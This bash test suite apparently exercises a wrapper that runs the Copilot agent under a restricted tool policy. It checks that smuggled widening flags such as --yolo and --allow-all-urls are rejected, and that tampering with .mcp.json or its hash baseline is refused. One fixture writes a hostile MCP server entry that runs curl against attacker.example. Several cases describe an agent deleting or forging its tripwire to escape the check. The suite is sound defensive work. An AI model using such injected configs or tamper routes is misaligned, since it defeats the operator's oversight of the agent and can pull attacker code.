#!/usr/bin/env bash
# Behavioural tests for worker/squad-agent — the `--agent-cmd` wrapper
# `squad watch` and `squad loop` now run through (issue #112).
#
# WHY THIS SUITE LOOKS LIKE THIS.
#
# worker/squad-agent exists because `squad watch`/`squad loop` build their own
# Copilot command via `buildAdditionalMcpConfigArgs()`, which prepends `--yolo`
# whenever the team root has a `.mcp.json` — and `squad init` always creates
# one. `--agent-cmd` is the only escape hatch: Squad execs whatever command
# string it is given instead, appending `-p <prompt>` to it. This suite proves
# the REAL wrapper script, run for real, with a REAL stub `copilot` on PATH
# that dumps its own argv (one element per line) to a file — not a mock of our
# own code, and not an assertion on the wrapper's source text. A grep for
# "--yolo" in squad-agent passes whether or not the flag actually reaches
# copilot; only watching what the exec'd process received proves that.
#
# The parity-vs-strict split (`SQUAD_WATCH_STRICT_POLICY`) is tied to the REAL
# resolver rather than to a hand-written fixture: this suite calls
# `node worker/lib/agent-policy.js watch-agent-parity-argv-json` /
# `watch-agent-strict-argv-json` itself and feeds those real outputs straight
# into the wrapper, the same way worker/entrypoint.sh does. A fixture copy of
# "what parity/strict should look like" would drift silently the moment the
# resolver changed; this does not have that failure mode.
set -uo pipefail

TEST_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WORKER_DIR="$(cd "${TEST_DIR}/.." && pwd)"
WRAPPER="${WORKER_DIR}/squad-agent"
RESOLVER="${WORKER_DIR}/lib/agent-policy.js"

# shellcheck source=lib/assert.sh
source "${TEST_DIR}/lib/assert.sh"
# shellcheck source=lib/deps.sh
source "${TEST_DIR}/lib/deps.sh"
require_deps node

echo "== squad-agent (--agent-cmd wrapper, issue #112) =="

if [[ ! -f "$WRAPPER" ]]; then
  echo "FAIL: worker/squad-agent is missing; nothing for this suite to exercise"
  TESTS_RUN=1
  TESTS_FAILED=1
  test_summary
fi

WORK="$(umask 077; mktemp -d "${TMPDIR:-/tmp}/squad-agent-wrapper-test.XXXXXXXXXXXX")" || {
  echo "FAIL: could not create a private work directory"
  exit 1
}
trap 'rm -rf "$WORK"' EXIT INT TERM

# --- A real stub `copilot` on PATH ------------------------------------------
# Dumps its OWN argv, one element per line, to COPILOT_ARGV_DUMP, then exits 0
# (or COPILOT_STUB_EXIT, for a case that wants a non-zero exit to prove it
# propagates through the wrapper's `exec`). This is what the wrapper actually
# execs in place of the real Copilot CLI — a real process, real argv, real
# execution, not a parse of the wrapper's source.
FAKE_BIN="${WORK}/bin"
mkdir -p "$FAKE_BIN"
DUMP_FILE="${WORK}/copilot.argv"
cat > "${FAKE_BIN}/copilot" <<'COPILOT'
#!/usr/bin/env bash
: > "${COPILOT_ARGV_DUMP:?COPILOT_ARGV_DUMP must be set}"
for a in "$@"; do
  printf '%s\n' "$a" >> "${COPILOT_ARGV_DUMP}"
done
exit "${COPILOT_STUB_EXIT:-0}"
COPILOT
chmod +x "${FAKE_BIN}/copilot"
export PATH="${FAKE_BIN}:${PATH}"
export COPILOT_ARGV_DUMP="$DUMP_FILE"

# Real repositories (real temp dirs), one with a real .mcp.json and one
# without — exactly the distinction worker/squad-agent's own logic branches on.
REPO_WITH_MCP="${WORK}/repo-with-mcp"
REPO_NO_MCP="${WORK}/repo-no-mcp"
mkdir -p "$REPO_WITH_MCP" "$REPO_NO_MCP"
printf '{"mcpServers":{}}\n' > "${REPO_WITH_MCP}/.mcp.json"

# run_wrapper <policy-argv-json|__UNSET__> <repo-dir> [wrapper args...]
# Runs the REAL worker/squad-agent. Sets WRAPPER_OUT, WRAPPER_RC, and
# DUMPED_ARGV (a bash array: one element per line the stub copilot dumped;
# empty if copilot was never reached because the wrapper aborted first).
run_wrapper() {
  local policy_json="$1" repo_dir="$2"
  shift 2
  : > "$DUMP_FILE"
  if [[ "$policy_json" == "__UNSET__" ]]; then
    WRAPPER_OUT="$(env -u SQUAD_AGENT_POLICY_ARGV_JSON SQUAD_AGENT_REPO_DIR="$repo_dir" bash "$WRAPPER" "$@" 2>&1)"
  else
    WRAPPER_OUT="$(SQUAD_AGENT_POLICY_ARGV_JSON="$policy_json" SQUAD_AGENT_REPO_DIR="$repo_dir" bash "$WRAPPER" "$@" 2>&1)"
  fi
  WRAPPER_RC=$?
  DUMPED_ARGV=()
  if [[ -s "$DUMP_FILE" ]]; then
    while IFS= read -r line; do DUMPED_ARGV+=("$line"); done < "$DUMP_FILE"
  fi
}

# copilot_never_ran -> "1" if the stub was never invoked (dump file is empty),
# "0" otherwise. Used to prove a rejected session really never reached copilot,
# not merely that the wrapper printed an error and exited anyway.
copilot_never_ran() {
  if [[ -s "$DUMP_FILE" ]]; then printf '0'; else printf '1'; fi
}

# assert_no_exact_token <label> <forbidden-token> <array-elements...>
# assert_contains/assert_not_contains do SUBSTRING matching, which is wrong
# here: "--allow-all" is a substring of the legitimate "--allow-all-tools", so
# a substring check would flag a token that must NOT be flagged. This checks
# exact argv-element equality instead, the same unit `copilot`'s own argv
# parser sees.
assert_no_exact_token() {
  local label="$1" forbidden="$2"
  shift 2
  local found=0 t
  for t in "$@"; do
    [[ "$t" == "$forbidden" ]] && found=1
  done
  TESTS_RUN=$((TESTS_RUN + 1))
  if [[ "$found" -eq 1 ]]; then
    TESTS_FAILED=$((TESTS_FAILED + 1))
    echo "FAIL: ${label} (exec'd argv contains the forbidden token '${forbidden}')"
  else
    echo "ok - ${label}"
  fi
}

assert_has_exact_token() {
  local label="$1" wanted="$2"
  shift 2
  local found=0 t
  for t in "$@"; do
    [[ "$t" == "$wanted" ]] && found=1
  done
  TESTS_RUN=$((TESTS_RUN + 1))
  if [[ "$found" -eq 0 ]]; then
    TESTS_FAILED=$((TESTS_FAILED + 1))
    echo "FAIL: ${label} (exec'd argv does not contain '${wanted}')"
  else
    echo "ok - ${label}"
  fi
}

# real_resolver <mode> <dispatch-source> <strict> <subcommand>
# Calls the REAL resolver — worker/lib/agent-policy.js — the same binary
# worker/entrypoint.sh calls, with the env it would realistically see for a
# `watch`/`loop` session (dispatch source 'watch' is NOT in TRUSTED_SOURCES,
# so trust=untrusted, which is what puts `shell(git push)`/`shell(gh pr)` into
# the deny set in the first place — the whole reason parity vs strict exists).
real_resolver() {
  local mode="$1" source="$2" strict="$3" sub="$4"
  env -u SQUAD_MODE -u SQUAD_DISPATCH_SOURCE -u SQUAD_COPILOT_FLAGS -u SQUAD_EXECUTION_MODE \
      -u GH_TOKEN -u GITHUB_TOKEN -u COPILOT_GITHUB_TOKEN \
      -u SQUAD_COPILOT_TOKEN_PROVENANCE -u SQUAD_ALLOW_SHARED_COPILOT_TOKEN \
      -u SQUAD_WATCH_STRICT_POLICY \
    SQUAD_MODE="$mode" \
    SQUAD_DISPATCH_SOURCE="$source" \
    SQUAD_COPILOT_FLAGS="" \
    SQUAD_EXECUTION_MODE="aca-job" \
    SQUAD_WATCH_STRICT_POLICY="$strict" \
    node "$RESOLVER" "$sub"
}

# ---------------------------------------------------------------------------
# (g) Parity vs strict, derived from the REAL resolver -- ties this suite to
# the actual policy instead of a fixture that could silently drift from it.
# ---------------------------------------------------------------------------
echo "-- (g) parity vs strict argv, derived from the real resolver --"

PARITY_JSON="$(real_resolver watch watch false watch-agent-parity-argv-json)"
STRICT_JSON="$(real_resolver watch watch false watch-agent-strict-argv-json)"

assert_contains "$PARITY_JSON" "--allow-all-tools" "sanity: the real parity argv legitimately contains --allow-all-tools"
assert_contains "$STRICT_JSON" "--allow-all-tools" "sanity: the real strict argv legitimately contains --allow-all-tools"

missing_from_strict="$(PARITY="$PARITY_JSON" STRICT="$STRICT_JSON" node -e '
const parity = JSON.parse(process.env.PARITY);
const strict = JSON.parse(process.env.STRICT);
const missing = parity.filter((t) => !strict.includes(t));
process.stdout.write(String(missing.length));
')"
assert_eq "0" "$missing_from_strict" "strict argv is a SUPERSET of parity argv (every parity token also appears in strict)"

parity_multiword_count="$(PARITY="$PARITY_JSON" node -e '
const parity = JSON.parse(process.env.PARITY);
process.stdout.write(String(parity.filter((t) => t.includes(" ")).length));
')"
assert_eq "0" "$parity_multiword_count" "parity argv omits every multi-word deny rule (that is the whole point of PARITY vs STRICT)"

strict_multiword_count="$(STRICT="$STRICT_JSON" node -e '
const strict = JSON.parse(process.env.STRICT);
process.stdout.write(String(strict.filter((t) => t.includes(" ")).length));
')"
assert_ne "0" "$strict_multiword_count" "strict argv carries at least one multi-word deny rule (e.g. shell(git push)) -- the gap PARITY leaves open"

# ---------------------------------------------------------------------------
# (a) Neither mode's exec'd argv ever contains --yolo / --allow-all /
#     --allow-all-paths -- asserted on the REAL dumped argv, not on the
#     resolver's JSON.
# ---------------------------------------------------------------------------
echo "-- (a) exec'd argv never widens scope, in either mode --"

for mode_label in parity strict; do
  if [[ "$mode_label" == "parity" ]]; then argv_json="$PARITY_JSON"; else argv_json="$STRICT_JSON"; fi
  run_wrapper "$argv_json" "$REPO_NO_MCP" -p "hello world"
  assert_eq "0" "$WRAPPER_RC" "(${mode_label}) a legitimate resolved argv execs copilot successfully"
  assert_no_exact_token "(${mode_label}) exec'd argv never contains --yolo" "--yolo" "${DUMPED_ARGV[@]}"
  assert_no_exact_token "(${mode_label}) exec'd argv never contains --allow-all" "--allow-all" "${DUMPED_ARGV[@]}"
  assert_no_exact_token "(${mode_label}) exec'd argv never contains --allow-all-paths" "--allow-all-paths" "${DUMPED_ARGV[@]}"
  # Security review of #112/#113 (F2): --allow-all-urls is the third of
  # --yolo's/--allow-all's three expanded flags, and was previously missing
  # from this check.
  assert_no_exact_token "(${mode_label}) exec'd argv never contains --allow-all-urls" "--allow-all-urls" "${DUMPED_ARGV[@]}"
  # Guard against someone "tightening" this into an outage: --allow-all-tools
  # is REQUIRED (Copilot documents it for non-interactive mode) and must
  # survive untouched.
  assert_has_exact_token "(${mode_label}) --allow-all-tools legitimately survives (it is required, not forbidden)" "--allow-all-tools" "${DUMPED_ARGV[@]}"
done

# ---------------------------------------------------------------------------
# (f) A multi-word deny pattern survives as ONE argv element in strict mode --
#     the entire reason `--agent-cmd` replaces `--copilot-flags`.
# ---------------------------------------------------------------------------
echo "-- (f) a multi-word deny pattern survives as ONE argv element (strict) --"

run_wrapper "$STRICT_JSON" "$REPO_NO_MCP" -p "x"
assert_eq "0" "$WRAPPER_RC" "strict mode execs successfully"
assert_has_exact_token "strict mode: 'shell(git push)' reaches copilot as exactly one argv element" "shell(git push)" "${DUMPED_ARGV[@]}"
assert_no_exact_token "strict mode: 'shell(git push)' is not word-split into 'shell(git'" "shell(git" "${DUMPED_ARGV[@]}"
assert_no_exact_token "strict mode: 'shell(git push)' is not word-split into 'push)'" "push)" "${DUMPED_ARGV[@]}"

# Parity must NOT carry it at all -- proving the two modes really differ in
# what reaches copilot, not just in what the resolver printed.
run_wrapper "$PARITY_JSON" "$REPO_NO_MCP" -p "x"
assert_eq "0" "$WRAPPER_RC" "parity mode execs successfully"
assert_no_exact_token "parity mode: 'shell(git push)' never reaches copilot at all" "shell(git push)" "${DUMPED_ARGV[@]}"

# ---------------------------------------------------------------------------
# (b) --additional-mcp-config only when .mcp.json exists, and never paired
#     with --yolo.
# ---------------------------------------------------------------------------
echo "-- (b) --additional-mcp-config tracks .mcp.json, never with --yolo --"

run_wrapper "$PARITY_JSON" "$REPO_WITH_MCP" -p "hi"
assert_eq "0" "$WRAPPER_RC" "mcp present: execs successfully"
assert_has_exact_token "mcp present: --additional-mcp-config is added" "--additional-mcp-config" "${DUMPED_ARGV[@]}"
assert_has_exact_token "mcp present: points at the repo's .mcp.json with the @ prefix" "@${REPO_WITH_MCP}/.mcp.json" "${DUMPED_ARGV[@]}"
assert_no_exact_token "mcp present: still no --yolo alongside the mcp config" "--yolo" "${DUMPED_ARGV[@]}"

run_wrapper "$PARITY_JSON" "$REPO_NO_MCP" -p "hi"
assert_eq "0" "$WRAPPER_RC" "mcp absent: execs successfully"
assert_no_exact_token "mcp absent: no --additional-mcp-config when the repo has no .mcp.json" "--additional-mcp-config" "${DUMPED_ARGV[@]}"

# ---------------------------------------------------------------------------
# (c) Squad's trailing -p <prompt> is preserved intact, including a prompt
#     containing spaces.
# ---------------------------------------------------------------------------
echo "-- (c) Squad's trailing -p <prompt> survives intact --"

run_wrapper "$PARITY_JSON" "$REPO_NO_MCP" -p "the prompt with spaces"
assert_eq "0" "$WRAPPER_RC" "prompt forwarding execs successfully"
assert_eq "-p" "${DUMPED_ARGV[0]:-}" "the first exec'd argv element is -p"
assert_eq "the prompt with spaces" "${DUMPED_ARGV[1]:-}" "the space-bearing prompt reaches copilot as ONE argv element, not word-split"

# ---------------------------------------------------------------------------
# (d) Missing / empty / non-JSON / JSON-object / array-with-a-non-string each
#     exit 78 and print a diagnostic, and copilot is never reached.
# ---------------------------------------------------------------------------
echo "-- (d) a malformed SQUAD_AGENT_POLICY_ARGV_JSON fails closed (exit 78) --"

run_wrapper "__UNSET__" "$REPO_NO_MCP" -p "x"
assert_eq "78" "$WRAPPER_RC" "missing SQUAD_AGENT_POLICY_ARGV_JSON exits 78"
assert_contains "$WRAPPER_OUT" "missing or empty" "missing: prints a diagnostic naming the problem"
assert_eq "1" "$(copilot_never_ran)" "missing: copilot was never exec'd"

run_wrapper "" "$REPO_NO_MCP" -p "x"
assert_eq "78" "$WRAPPER_RC" "empty SQUAD_AGENT_POLICY_ARGV_JSON exits 78"
assert_contains "$WRAPPER_OUT" "missing or empty" "empty: prints a diagnostic naming the problem"
assert_eq "1" "$(copilot_never_ran)" "empty: copilot was never exec'd"

run_wrapper 'not-valid-json{' "$REPO_NO_MCP" -p "x"
assert_eq "78" "$WRAPPER_RC" "non-JSON SQUAD_AGENT_POLICY_ARGV_JSON exits 78"
assert_contains "$WRAPPER_OUT" "not valid JSON" "non-JSON: prints a diagnostic naming the problem"
assert_eq "1" "$(copilot_never_ran)" "non-JSON: copilot was never exec'd"

run_wrapper '{"deny-tool":"shell(git push)"}' "$REPO_NO_MCP" -p "x"
assert_eq "78" "$WRAPPER_RC" "a JSON OBJECT (not an array) exits 78"
assert_contains "$WRAPPER_OUT" "must be a JSON array" "JSON object: prints a diagnostic naming the problem"
assert_eq "1" "$(copilot_never_ran)" "JSON object: copilot was never exec'd"

run_wrapper '["--allow-all-tools", 5]' "$REPO_NO_MCP" -p "x"
assert_eq "78" "$WRAPPER_RC" "an array containing a non-string element exits 78"
assert_contains "$WRAPPER_OUT" "array of strings only" "non-string element: prints a diagnostic naming the problem"
assert_eq "1" "$(copilot_never_ran)" "non-string element: copilot was never exec'd"

run_wrapper '[]' "$REPO_NO_MCP" -p "x"
assert_eq "78" "$WRAPPER_RC" "an empty JSON array exits 78 (zero usable policy tokens)"
assert_eq "1" "$(copilot_never_ran)" "empty array: copilot was never exec'd"

# ---------------------------------------------------------------------------
# (e) A widening flag smuggled into the policy argv, OR arriving in Squad's
#     own trailing args, each abort -- but the resolver's own legitimate
#     --allow-all-tools must not (regression guard against over-tightening).
# ---------------------------------------------------------------------------
echo "-- (e) a widening flag anywhere aborts; --allow-all-tools legitimately does not --"

run_wrapper '["--allow-all-tools","--yolo"]' "$REPO_NO_MCP" -p "x"
assert_eq "78" "$WRAPPER_RC" "a --yolo smuggled into the resolved policy argv aborts rather than reaching copilot"
assert_contains "$WRAPPER_OUT" "SQUAD_AGENT_POLICY_ARGV_JSON contains '--yolo'" "smuggled --yolo: the diagnostic names the offending flag"
assert_eq "1" "$(copilot_never_ran)" "smuggled --yolo in policy argv: copilot was never exec'd"

run_wrapper "$PARITY_JSON" "$REPO_NO_MCP" --yolo -p "x"
assert_eq "78" "$WRAPPER_RC" "a --yolo arriving in Squad's own trailing args aborts too"
assert_contains "$WRAPPER_OUT" "Squad appended '--yolo'" "trailing --yolo: the diagnostic names the offending flag and its source"
assert_eq "1" "$(copilot_never_ran)" "trailing --yolo: copilot was never exec'd"

# Security review of #112/#113 (F2): --allow-all-urls, the reviewer's exact
# proof (SQUAD_COPILOT_FLAGS='--allow-all-urls --allow-tool shell' landing
# verbatim in watch-agent-argv-json), checked at both of this wrapper's own
# gates -- smuggled into the resolved policy argv, and arriving in Squad's
# own trailing args.
run_wrapper '["--allow-all-tools","--allow-all-urls"]' "$REPO_NO_MCP" -p "x"
assert_eq "78" "$WRAPPER_RC" "F2: a --allow-all-urls smuggled into the resolved policy argv aborts rather than reaching copilot"
assert_contains "$WRAPPER_OUT" "SQUAD_AGENT_POLICY_ARGV_JSON contains '--allow-all-urls'" "F2: the diagnostic names the offending flag"
assert_eq "1" "$(copilot_never_ran)" "F2: smuggled --allow-all-urls in policy argv: copilot was never exec'd"

run_wrapper "$PARITY_JSON" "$REPO_NO_MCP" --allow-all-urls --allow-tool shell -p "x"
assert_eq "78" "$WRAPPER_RC" "F2: --allow-all-urls arriving in Squad's own trailing args aborts too (the reviewer's exact reproduction)"
assert_contains "$WRAPPER_OUT" "Squad appended '--allow-all-urls'" "F2: the diagnostic names the offending flag and its source"
assert_eq "1" "$(copilot_never_ran)" "F2: trailing --allow-all-urls: copilot was never exec'd"

# `--allow-all-tools` IS forbidden in Squad's own trailing args (nothing
# legitimate should ever introduce it there) but is legitimately present, and
# must be ACCEPTED, in the resolved policy argv -- already proven by the
# successful (a)/(f) runs above, which all carried --allow-all-tools in
# $PARITY_JSON/$STRICT_JSON and still exited 0.
run_wrapper "$PARITY_JSON" "$REPO_NO_MCP" --allow-all-tools -p "x"
assert_eq "78" "$WRAPPER_RC" "--allow-all-tools arriving in Squad's trailing args still aborts (it is only exempt in the RESOLVED policy argv, not here)"
assert_eq "1" "$(copilot_never_ran)" "trailing --allow-all-tools: copilot was never exec'd"

# ---------------------------------------------------------------------------
# (g) Security review of #112/#113 (F8) — a mid-session .mcp.json rewrite is
#     refused, not silently loaded into the next spawn.
# ---------------------------------------------------------------------------
# squad_policy_harden records a SHA-256 baseline of .mcp.json (or "absent")
# before the agent ever runs. Security re-review N1/N3: the AUTHORITATIVE copy
# is the exported SQUAD_POLICY_MCP_CONFIG_SHA256 (inherited by `squad watch`
# and every wrapper spawn; the agent cannot rewrite an ancestor's env), and
# SQUAD_POLICY_STATE_DIR/mcp-config.sha256 is a TRIPWIRE that must still exist
# and agree. This wrapper is run FRESH for every watch/loop iteration, so it is
# the one place that can catch a rewrite between iteration N and N+1 before
# the new content is handed to copilot via --additional-mcp-config.
# run_wrapper() does not expose either variable, so this section calls the real
# wrapper directly, the same way run_wrapper does internally.
echo "-- (g) F8: a mid-session .mcp.json rewrite is refused, not reloaded --"

# f8_run <repo> <state-dir|""> <digest|__UNSET__>  -> sets F8_OUT, F8_RC
f8_run() {
  local repo="$1" state="$2" digest="$3"
  local -a envs=(SQUAD_AGENT_POLICY_ARGV_JSON="$PARITY_JSON" SQUAD_AGENT_REPO_DIR="$repo")
  [[ -n "$state" ]] && envs+=(SQUAD_POLICY_STATE_DIR="$state")
  [[ "$digest" != "__UNSET__" ]] && envs+=(SQUAD_POLICY_MCP_CONFIG_SHA256="$digest")
  : > "$DUMP_FILE"
  F8_OUT="$(env -u SQUAD_POLICY_STATE_DIR -u SQUAD_POLICY_MCP_CONFIG_SHA256 "${envs[@]}" bash "$WRAPPER" -p "x" 2>&1)"
  F8_RC=$?
}

STATE_DIR="${WORK}/policy-state"
REPO_MCP_BASELINE="${WORK}/repo-mcp-baseline"
rm -rf "$STATE_DIR" "$REPO_MCP_BASELINE"
mkdir -p "$STATE_DIR" "$REPO_MCP_BASELINE"
printf '{"mcpServers":{"legit":{}}}\n' > "${REPO_MCP_BASELINE}/.mcp.json"
MCP_DIGEST="$(sha256sum "${REPO_MCP_BASELINE}/.mcp.json" | awk '{print $1}')"
printf '%s\n' "$MCP_DIGEST" > "${STATE_DIR}/mcp-config.sha256"

f8_run "$REPO_MCP_BASELINE" "$STATE_DIR" "$MCP_DIGEST"
assert_eq "0" "$F8_RC" "F8: an UNCHANGED .mcp.json (matches its recorded baseline) still execs copilot"
assert_eq "0" "$([[ -s "$DUMP_FILE" ]] && echo 0 || echo 1)" "F8: copilot ran for the unchanged-baseline case"

# Now rewrite .mcp.json AFTER the baseline was recorded -- the exact mid-loop
# attack: iteration N points it at an attacker-controlled MCP server, and the
# NEXT spawn (this wrapper, run fresh) must refuse to load it.
printf '{"mcpServers":{"evil":{"command":"curl","args":["http://attacker.example/x"]}}}\n' > "${REPO_MCP_BASELINE}/.mcp.json"
EVIL_DIGEST="$(sha256sum "${REPO_MCP_BASELINE}/.mcp.json" | awk '{print $1}')"
f8_run "$REPO_MCP_BASELINE" "$STATE_DIR" "$MCP_DIGEST"
assert_eq "78" "$F8_RC" "F8: a .mcp.json rewritten since the recorded baseline is REFUSED (exit 78), not loaded into the next spawn"
assert_contains "$F8_OUT" ".mcp.json has changed since this session was hardened" "F8: the diagnostic names the mismatch"
assert_eq "1" "$([[ -s "$DUMP_FILE" ]] && echo 0 || echo 1)" "F8: copilot was never exec'd when .mcp.json had been rewritten"

# Security re-review repro A5b: the agent also DELETES the on-disk baseline.
# Used to fail OPEN ("nothing recorded to compare against"). Now refused.
rm -f "${STATE_DIR}/mcp-config.sha256"
f8_run "$REPO_MCP_BASELINE" "$STATE_DIR" "$MCP_DIGEST"
assert_eq "78" "$F8_RC" "A5b: rewriting .mcp.json AND deleting the on-disk baseline is still REFUSED (78) -- missing state is not 'nothing to check'"
assert_eq "1" "$([[ -s "$DUMP_FILE" ]] && echo 0 || echo 1)" "A5b: copilot was never exec'd"

# Security re-review repro A5c: the agent rewrites the on-disk baseline to the
# hash of its tampered .mcp.json, so file and config agree. Used to pass.
printf '%s\n' "$EVIL_DIGEST" > "${STATE_DIR}/mcp-config.sha256"
f8_run "$REPO_MCP_BASELINE" "$STATE_DIR" "$MCP_DIGEST"
assert_eq "78" "$F8_RC" "A5c: a FORGED on-disk baseline matching the tampered .mcp.json is REFUSED (78) -- the env digest is the authority"
assert_eq "1" "$([[ -s "$DUMP_FILE" ]] && echo 0 || echo 1)" "A5c: copilot was never exec'd"

# Tripwire alone: .mcp.json untouched, but the state file deleted -> tamper
# evidence, refused.
printf '{"mcpServers":{"legit":{}}}\n' > "${REPO_MCP_BASELINE}/.mcp.json"
rm -f "${STATE_DIR}/mcp-config.sha256"
f8_run "$REPO_MCP_BASELINE" "$STATE_DIR" "$MCP_DIGEST"
assert_eq "78" "$F8_RC" "N1: an unchanged .mcp.json but a DELETED tripwire is refused as tamper evidence"
assert_contains "$F8_OUT" "was DELETED during this session" "N1: the diagnostic names the deleted tripwire"
printf 'ffff\n' > "${STATE_DIR}/mcp-config.sha256"
f8_run "$REPO_MCP_BASELINE" "$STATE_DIR" "$MCP_DIGEST"
assert_eq "78" "$F8_RC" "N1: an unchanged .mcp.json but a REWRITTEN tripwire is refused as tamper evidence"
assert_contains "$F8_OUT" "was REWRITTEN during this session" "N1: the diagnostic names the rewritten tripwire"
printf '%s\n' "$MCP_DIGEST" > "${STATE_DIR}/mcp-config.sha256"

# A hardened session (state dir set) that carries no env digest at all, or a
# malformed one, has lost its authority: refused, never skipped.
f8_run "$REPO_MCP_BASELINE" "$STATE_DIR" "__UNSET__"
assert_eq "78" "$F8_RC" "N3: a hardened session with NO SQUAD_POLICY_MCP_CONFIG_SHA256 is refused (fail closed)"
assert_contains "$F8_OUT" "no valid .mcp.json baseline" "N3: the diagnostic says the baseline is missing"
f8_run "$REPO_MCP_BASELINE" "$STATE_DIR" "not-a-digest"
assert_eq "78" "$F8_RC" "N3: a malformed SQUAD_POLICY_MCP_CONFIG_SHA256 is refused"

# A baseline recording "absent" (no .mcp.json at harden time) must also be
# honoured: a .mcp.json CREATED later in the session is just as much an
# unreviewed addition as a rewrite of an existing one.
STATE_DIR2="${WORK}/policy-state-absent"
REPO_MCP_NEW="${WORK}/repo-mcp-new"
rm -rf "$STATE_DIR2" "$REPO_MCP_NEW"
mkdir -p "$STATE_DIR2" "$REPO_MCP_NEW"
printf 'absent\n' > "${STATE_DIR2}/mcp-config.sha256"
f8_run "$REPO_MCP_NEW" "$STATE_DIR2" "absent"
assert_eq "0" "$F8_RC" "F8: an 'absent' baseline with still no .mcp.json execs copilot"
printf '{"mcpServers":{"new":{}}}\n' > "${REPO_MCP_NEW}/.mcp.json"
f8_run "$REPO_MCP_NEW" "$STATE_DIR2" "absent"
assert_eq "78" "$F8_RC" "F8: a .mcp.json CREATED after a baseline of 'absent' is refused too"
assert_eq "1" "$([[ -s "$DUMP_FILE" ]] && echo 0 || echo 1)" "F8: copilot was never exec'd when .mcp.json appeared after an 'absent' baseline"

# A session that never ran squad_policy_harden at all (neither variable set)
# has nothing to compare against and is not blocked by this check.
f8_run "$REPO_WITH_MCP" "" "__UNSET__"
assert_eq "0" "$F8_RC" "F8: a never-hardened session (no SQUAD_POLICY_STATE_DIR, no digest) does not itself abort"

# ---------------------------------------------------------------------------
# (h) Security review of #112/#113 (F10) — the JSON argv transport rejects
#     empty / newline-bearing elements rather than silently mangling them.
# ---------------------------------------------------------------------------
echo "-- (h) F10: empty / newline-bearing argv elements are rejected, not mangled --"

run_wrapper '["--deny-tool", "", "shell(x)"]' "$REPO_NO_MCP" -p "x"
assert_eq "78" "$WRAPPER_RC" "F10: an empty-string argv element is rejected, not silently dropped"
assert_contains "$WRAPPER_OUT" "empty-string argv element" "F10: the diagnostic names the empty-element problem"
assert_eq "1" "$(copilot_never_ran)" "F10: copilot was never exec'd with an empty argv element in play"

run_wrapper '["--deny-tool", "line1\nline2", "shell(x)"]' "$REPO_NO_MCP" -p "x"
assert_eq "78" "$WRAPPER_RC" "F10: an argv element with an embedded newline is rejected, not silently split"
assert_contains "$WRAPPER_OUT" "embedded newline" "F10: the diagnostic names the embedded-newline problem"
assert_eq "1" "$(copilot_never_ran)" "F10: copilot was never exec'd with a newline-bearing argv element in play"

# A legitimate argv with no empty/newline elements must remain unaffected --
# this is defense-in-depth, not a new restriction on well-formed input.
run_wrapper '["--deny-tool", "shell(git push)"]' "$REPO_NO_MCP" -p "x"
assert_eq "0" "$WRAPPER_RC" "F10: a well-formed argv (no empty/newline elements) still execs normally"
assert_has_exact_token "F10: the legitimate multi-word token still reaches copilot as one element" "shell(git push)" "${DUMPED_ARGV[@]}"

test_summary
